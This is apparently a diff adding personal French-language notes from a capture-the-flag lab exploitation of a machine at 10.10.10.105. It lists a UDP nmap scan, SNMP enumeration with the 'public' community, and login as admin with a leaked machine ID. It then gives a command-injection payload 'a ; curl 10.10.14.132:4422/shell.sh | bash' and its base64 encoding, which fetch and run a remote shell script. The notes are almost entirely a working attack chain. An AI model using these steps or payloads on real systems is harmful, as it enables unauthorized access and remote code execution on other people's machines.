@@ -1,0 +1,14 @@
+Port udp ouvert
+	nmap -sU 10.10.10.105
+Enum port udp 
+	snmpwalk -v2c -c public 10.10.10.105
+Machine_ID
+	NET_45JDX23
+Se connecter sur la page as :
+	admin 
+	NET_45JDX23
+Dans la partie Diagnosytics
+into burp injection de commandes encodées en base64
+	-- avoir ses listeners ready
+	a ; curl 10.10.14.132:4422/shell.sh | bash
+	YTsgY3VybCAxMC4xMC4xNC4xMzI6NDQyMi9zaGVsbC5zaCB8IGJhc2g
